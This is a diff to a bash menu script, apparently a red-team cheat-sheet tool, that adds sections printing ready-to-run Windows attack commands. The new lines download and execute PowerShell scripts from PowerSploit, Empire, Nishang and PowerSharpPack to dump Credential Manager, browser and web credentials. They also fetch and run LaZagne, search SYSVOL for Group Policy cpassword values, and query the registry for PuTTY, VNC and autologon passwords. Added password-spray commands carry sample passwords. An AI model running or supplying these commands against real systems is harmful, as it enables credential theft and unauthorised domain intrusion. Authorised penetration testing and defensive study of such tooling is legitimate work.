@@ -79,9 +79,10 @@ echo -ne " What would you like to do?
 
 	1)  ->  [ Credential Access	]
 	2)  ->  [ MiTM Attacks 		]
-        3)  ->  [ Password Spraying 	]
-        4)  ->  [ Privilege Escalation	]
-        5)  ->  [ Recon 		]
+	3)  ->  [ MSSQL 		]
+        4)  ->  [ Password Spraying 	]
+        5)  ->  [ Privilege Escalation	]
+        6)  ->  [ Recon 		]
         
         a)  ->	[ AMSI Bypasses		]
         
@@ -90,9 +91,10 @@ echo -ne " What would you like to do?
         case $a in
                 1) 	Internal_Menu_Credential_Access ;;
         	2) 	Internal_Menu_MiTM_Attacks ;;
-	        3) 	Internal_Menu_Password_Spraying ;;
-	        4) 	Internal_Menu_Privilege_Escalation ;;
-	        5) 	Internal_Menu_Recon ;;
+        	3) 	Internal_Menu_MSSQL ;;
+	        4) 	Internal_Menu_Password_Spraying ;;
+	        5) 	Internal_Menu_Privilege_Escalation ;;
+	        6) 	Internal_Menu_Recon ;;
 	        a|A)	Internal_Menu_AMSI_Bypasses ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
@@ -264,6 +266,157 @@ echo -e "${IBLUE}SharpSecDump${RESTORE}"
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
+echo -e ""
+
+}
+
+Internal_Menu_Credential_Access_Credential_Manager(){
+
+	clear
+
+echo -e ""
+echo -e "" 
+echo -e ""      
+echo -e "${LGREEN}Credential Manager${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Get-VaultCredential${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Exfiltration/Get-VaultCredential.ps1);Get-VaultCredential"
+echo -e ""
+echo -e "${IBLUE}LaZagne${RESTORE}"
+echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
+echo -e ""
+echo -e "${IBLUE}Nishang${RESTORE}"
+echo -e "$DownloadMethod "$NishangRepo"Gather/Get-WebCredentials.ps1);Get-WebCredentials"
+echo -e ""
+echo -e ""
+
+}
+
+Internal_Menu_Credential_Access_Credential_Group_Policy(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Group Policy${RESTORE}"
+echo -e ""    
+echo -e "${IBLUE}CMD${RESTORE}"
+echo -ne "
+findstr /S cpassword %logonserver%\sysvol\*.xml
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+"
+echo -e ""  
+echo -e "${IBLUE}Get-CachedGPPPassword${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
+echo -e ""
+echo -e ""
+
+}
+
+Internal_Menu_Credential_Access_Credential_Web_Browsers(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Web Browsers${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}LaZagne${RESTORE}"
+echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
+echo -e ""
+echo -e "${IBLUE}SharpWeb${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Sharpweb.ps1);Invoke-Sharpweb -Command "\"full"\""
+echo -e ""
+echo -e ""
+
+}
+
+Internal_Menu_Credential_Access_Unsecured_Credentials(){
+
+	clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -ne " Select Unsecured Credentials Type
+
+
+
+        1)  ->  [ Credentials in Files 		]
+        2)  ->  [ Credentials in Registry	]
+"
+
+        read a
+        case $a in
+                1) 	Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Files ;;
+	        2) 	Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Registry ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+}
+
+
+Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Files(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Credentials in Files${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}CMD${RESTORE}"
+echo -e "findstr /si pass *.xml *.doc *.txt *.xls"
+echo -e "findstr /si cred *.xml *.doc *.txt *.xls"
+echo -e ""
+echo -e "${IBLUE}PowerShell${RESTORE}"
+echo -e "ls -R | select-string -Pattern 'password'"
+echo -e ""
+echo -e "${IBLUE}PowerUp${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Get-UnattendedInstallFile;Get-ApplicationHost;Get-Webconfig;Get-SiteListPassword;Get-CachedGPPPassword;Get-RegistryAutoLogon"
+echo -e ""
+echo -e ""
+echo -e "${IBLUE}SessionGopher${RESTORE}"
+echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher -Thorough"
+echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher -AllDomain -Thorough"
+echo -e ""
+echo -e ""
+
+}
+
+
+Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Registry(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Credentials in Registry${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}CMD${RESTORE}"
+echo -e ""
+echo -e "${YELLOW}String matching in registry${RESTORE}"
+echo -e "reg query HKLM /f password /t REG_SZ /s"
+echo -e "reg query HKCU /f password /t REG_SZ /s"
+echo -e ""
+echo -e "${YELLOW}Putty${RESTORE}"
+echo -e "reg query "\"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"\" /t REG_SZ /s"
+echo -e ""
+echo -e "${YELLOW}VNC${RESTORE}"
+echo -e "reg query "\"HKCU\\Software\\ORL\\WinVNC3\\Password"\""
+echo -e ""
+echo -e "${YELLOW}Windows autologin${RESTORE}"
+echo -e "reg query "\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"\""
+echo -e ""
+echo -e "${IBLUE}PowerShell${RESTORE}"
+echo -e "ls -R | select-string -Pattern 'password'"
+echo -e ""
+echo -e "${IBLUE}PowerUp${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Get-UnattendedInstallFile;Get-ApplicationHost;Get-Webconfig;Get-SiteListPassword;Get-CachedGPPPassword;Get-RegistryAutoLogon"
+echo -e ""
 echo -e ""
 
 }
@@ -877,6 +1030,8 @@ echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-Spr
 echo -e ""
 echo -e "${IBLUE}Domain Password Spray${RESTORE}"
 echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray"
+echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -Password Winter2022"
+echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt"
 echo -e ""
 echo -e "${IBLUE}Rubeus${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /password:Password123 /noticket /nowrap"\""
